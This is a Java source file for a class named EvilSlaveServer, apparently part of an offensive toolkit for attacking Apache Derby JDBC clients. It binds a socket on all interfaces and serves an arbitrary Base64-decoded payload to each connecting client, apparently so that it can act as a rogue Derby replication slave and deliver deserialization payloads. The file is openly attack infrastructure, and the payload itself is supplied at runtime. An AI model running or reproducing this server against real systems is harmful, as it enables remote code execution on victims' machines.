package me.n1ar4.derby;

import me.n1ar4.fake.log.LogUtil;

import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Base64;

public class EvilSlaveServer {
    private static int thePort;
    private static volatile boolean stopFlag = false;
    public static void stop(){
        stopFlag = true;
    }
    @SuppressWarnings("all")
    public static void start(String host,int port,String baseData) throws Exception {
        stopFlag = false;
        thePort = port;
        byte[] data = Base64.getDecoder().decode(baseData);
        ServerSocket server = new ServerSocket();
        InetSocketAddress address = new InetSocketAddress("0.0.0.0", port);
        server.bind(address);
        while (true) {
            if(stopFlag){
                LogUtil.log("derby receive exit signal");
                break;
            }
            Socket socket = server.accept();
            LogUtil.log("derby receive request");
            socket.getOutputStream().write(data);
            socket.getOutputStream().flush();
            Thread.sleep(500);
            socket.close();
        }
        server.close();
    }

    public static int getPort() {
        return thePort;
    }
}